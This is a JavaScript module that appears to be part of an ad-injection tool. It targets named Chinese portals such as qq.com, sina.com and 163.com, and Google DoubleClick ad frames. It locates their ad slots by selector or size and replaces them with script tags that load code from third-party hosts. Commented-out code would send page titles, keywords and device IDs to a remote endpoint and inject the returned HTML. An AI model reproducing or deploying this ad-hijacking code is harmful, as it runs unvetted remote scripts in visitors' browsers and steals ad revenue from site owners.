import $ from 'jquery';
import { CP_ID, AD_CONTENT_PATH } from './config';

const sizes = ['300:250', '200:200', '336:280', '250:250', '728:90', '640:96', '300:600', '970:100', '528:320', '960:90', '580:90', '960:60', '760:90', '640:128', '640:60', '468:60', '1000:560', '300:200', '400:300', '800:600', '130:300', '585:120', '760:200', '760:100', '430:50', '760:100', '392:72', '468:60', '240:400', '180:150', '160:600', '120:600', '120:240', '120:90', '120:90', '125:125', '234:72', '392:72', '468:60', '330:400', '662:100', '316:250', '680:250', '750:100', '761:100', '761:400', '960:100', '1000:100', '340:400', '320:400', '300:400', '840:100', '660:100', '260:250', '700:100', '580:100', '680:100', '280:250', '770:100', '600:100', '880:100', '640:300'];
const websites = [
  { name: '163.com', nodes: ['.post_recommend_ad'] },
  { name: '39.net', nodes: ['[class="artRbox MB15"]', '[class="artRbox MB20"]'] },
  { name: '500.com', nodes: ['page-ads', '.tz-fkcq', '.news_right_ad'] },
  { name: 'eastmoney.com', nodes: ['.header-silderad'] },
  { name: 'ifeng.com', nodes: ['.pic1000', '.pic300', '#box_ad01', '#padhide_1727', '#all_content_qiyefuwu_right', '.bd_t5', '.pao_ad_02', '#padhide_1954'] },
  { name: 'qq.com', nodes: ['.adLeft', '.adLeft700', '.adRight', '#QQCOM_N_Rectangle3', '#QQ_HP_Upright4', '#QQ_HP_bottom_Width', '#QQcom_all_Width1:1', '#F_Rectangle_N', '.g1', '.g2'] },
  { name: 'sina.com', nodes: ['#j_wrap_b8abfebd_6cf2_8996_40ac_083d063bf2ee', '[class="sinaads sinaads-done"]>ins>a'] },
  { name: 'sohu.com', nodes: ['.swf-top', '.godR'] },
  { name: 'tianya.cn', nodes: ['.adsame-box', '#tyskysp19137:last-child', '#tyskysp7888:last-child', '.adsame-box'] },
  { name: 'youku.com', nodes: ['.yk-AD-tong', '.ad-flag-wrap', '#ab_v_61204'] },
];
const replaceArr = [{
  append: '<div tag=very-ad><script type="text/javascript" smua="d=p&s=b&u=u3430741&w=300&h=250" src="//www.nkscdn.com/smu0/o.js"></script></div>',
  size: '300:250',
  ceil: 10, // 广告位上限
  status: 0,
}];
const adArr = [{
  append: "<script>var dxx_uid ='410BEC0057B948B7B745653B6B285EF8';var slot_dxx_w=640;var slot_dxx_h=100;</script>",
  type: 'text/javascript',
  className: 'dxx_agsc',
  src: 'https://se.jmf47.cn/dia_dx.js',
}];

const pcArr = [{
  append: "<script>var dxx_uid ='5E4048C4D40D980E937AC76397832FFC';var slot_dxx_w=300;var slot_dxx_h=250;</script>",
  type: 'text/javascript',
  className: 'dxx_agsc',
  src: 'https://se.jmf47.cn/dia_dx.js',
}];

function guid() {
  function s4() {
    return Math.floor((1 + Math.random()) * 0x10000)
      .toString(16)
      .substring(1);
  }
  return `${s4()}${s4()}-${s4()}-${s4()}-${s4()}-${s4()}${s4()}${s4()}-${s4()}${s4()}`;
}

const pageId = guid();
const randomId = () => `ad${Math.random().toString(36).substr(2)}`;

// ad宽度取整，2、3位数时末位为0,4位数时末两位为0
const changeWH = (num) => {
  const integerWH = Math.floor(num);
  const numlen = integerWH.toString().length;
  let finalWH = 0;
  switch (numlen) {
    case 2:
      finalWH = parseInt(Math.round(integerWH / 10), 10) * 10;
      break;
    case 3:
      finalWH = parseInt(Math.round(integerWH / 10), 10) * 10;
      break;
    case 4:
      finalWH = parseInt(integerWH / 100, 10) * 100;
      break;
    default:
      finalWH = 0;
  }
  return finalWH;
};

function isValuableRes(item) {
  const h = $(item).height();
  const w = $(item).width();
  const wh = `${changeWH(w)}:${changeWH(h)}`;
  for (let index = 0; index < sizes.length; index += 1) {
    const size = sizes[index];
    if (wh === size) return wh;
  }
  return false;
}

// function inject(uuid) {
//   if (!window.injectAppear) {
//     window.injectAppear = true;
//     $.ajax({
//       url: AD_CONTENT_PATH,
//       jsonp: 'callback',
//       dataType: 'jsonp',
//       data: {
//         format: 'json',
//         uuid,
//         cpId: CP_ID,
//         divW: 0,
//         divH: 0,
//         pageId,
//         device: window.device6xw4qsx || '',
//         adWay: 'inject',
//         title: document.title || '',
//         keywords: $('meta[name=keywords]').attr('content') || '',
//       },
//       success: (resp) => {
//         if (resp.html) {
//           $('body').append(resp.html);
//         }
//       },
//     });
//   }
// }

// function consumeResource(iframe, uuid) {
//   const itemW = iframe.width;
//   const itemH = iframe.height;
//   const w = itemW && itemW.replace('px', '');
//   const h = itemH && itemH.replace('px', '');
//   const randomId = `divReplace${Math.random().toString(36).substr(2)}`;
//   const style = `width:${w}px;height:${h}px;background:transparent;`;
//   const replaceDiv = document.createElement('div');
//   replaceDiv.setAttribute('style', style);
//   replaceDiv.setAttribute('id', randomId);
//   replaceDiv.setAttribute('tag', 'very-ad');
//   const { left: leftDoc } = $(iframe).offset();
//   const { top: topDoc } = $(iframe).offset();
//   const docH = $(document).height();
//   const docW = $(document).width();
//   const contentH = $(window).height();
//   let ps = null;
//   if (leftDoc + $(iframe).width() === docW && topDoc + $(iframe).height() === contentH) {
//     ps = 0;
//   } else {
//     ps = Math.ceil(topDoc / contentH);
//   }

//   $.ajax({
//     url: AD_CONTENT_PATH,
//     jsonp: 'callback',
//     dataType: 'jsonp',
//     data: {
//       format: 'json',
//       uuid,
//       pageId,
//       cpId: CP_ID,
//       divId: randomId,
//       divW: w,
//       divH: h,
//       left: leftDoc,
//       top: topDoc,
//       dW: docW,
//       dH: docH,
//       p: ps,
//       device: window.device6xw4qsx || '',
//       adWay: 'replace',
//       title: document.title || '',
//       keywords: $('meta[name=keywords]').attr('content') || '',
//     },
//     success: (resp) => {
//       const r = $(replaceDiv);
//       if (resp.html) {
//         r.append(resp.html);
//         $(iframe).parent().html(r);
//       }
//     },
//   });
// }

// function anylaseResource(uuid) {
//   // let isReplace = 0;
//   const iframes = document.getElementsByTagName('iframe');
//   for (let index = 0; index < iframes.length; index += 1) {
//     const item = iframes[index];
//     if (isValuableRes(item)) {
//       consumeResource(item, uuid);
//       // isReplace = 1;
//     }
//   }
//   // if (!isReplace) inject(uuid);
// }

function getAd() {
  const adIndex = Math.floor(Math.random() * adArr.length);
  // const blackIndex = Math.floor(Math.random() * injectArr.length);

  const adBottom = adArr[adIndex] || '';
  const adInject = '';

  if (adBottom && adBottom.src) {
    if (adBottom.append) {
      $('body').append(adBottom.append);
    }

    const src = document.createElement('script');

    for (const key in adBottom) {
      if (key !== 'append') {
        src[key] = adBottom[key];
      }
    }

    $('body').append(src);
  }

  if (adInject && adInject.src) {
    if (adInject.append) {
      $('body').append(adInject.append);
    }

    const src = document.createElement('script');

    for (const key in adInject) {
      if (key !== 'append') {
        src[key] = adInject[key];
      }
    }

    $('body').append(src);
  }
}

function getPc() {
  const pcIndex = Math.floor(Math.random() * pcArr.length);
  // const blackIndex = Math.floor(Math.random() * injectArr.length);

  const adBottom = pcArr[pcIndex] || '';
  const adInject = '';

  if (adBottom && adBottom.src) {
    if (adBottom.append) {
      $('body').append(adBottom.append);
    }

    const src = document.createElement('script');

    for (const key in adBottom) {
      if (key !== 'append') {
        src[key] = adBottom[key];
      }
    }

    $('body').append(src);
  }

  if (adInject && adInject.src) {
    if (adInject.append) {
      $('body').append(adInject.append);
    }

    const src = document.createElement('script');

    for (const key in adInject) {
      if (key !== 'append') {
        src[key] = adInject[key];
      }
    }

    $('body').append(src);
  }
}

function consumePlace(target, wh) {
  if (!wh) wh = isValuableRes(target);
  const len = replaceArr.length;
  if (wh) {
    for (let i = 0; i < len; i++) {
      const data = replaceArr[i];
      if (data.status < data.ceil && data.size === wh) { // 检查上限和查找广告
        $(target).replaceWith(data.append);
        data.status++;
        console.log(wh, data.status);
        break;
      }
    }
  }
}

function PCReplace() {
  const iframes = document.getElementsByTagName('iframe');
  const { host } = window.location;
  const ifrLen = iframes.length;
  console.log(ifrLen);
  const webLen = websites.length;
  for (let i = 0; i < webLen; i++) { // 针对固定标签：
    if (host.indexOf(websites[i].name) > -1) {
      const { nodes } = websites[i];
      const len = nodes.length;
      for (let x = 0; x < len; x++) {
        const target = $(`${nodes[x]}`);
        const num = target.length;
        if (!num) continue;
        for (let j = 0; j < num; j++) {
          consumePlace(target[j]);
        }
      }
      break;
    }
  }
  for (let index = 0; index < ifrLen; index++) { // 针对iframe
    consumePlace(iframes[index]);
  }
}

function mobileReplace() {
  const iframes = document.getElementsByTagName('iframe');
  for (let i = 0; i < iframes.length; i++) {
    const isAd = iframes[i].contentDocument && iframes[i].contentDocument.querySelector("iframe[src^='http://googleads.g.doubleclick.net']");
    if (isAd) {
      consumePlace(iframes[i], '300:250');
    }
  }
}

export { pageId, getAd, getPc, mobileReplace, PCReplace };
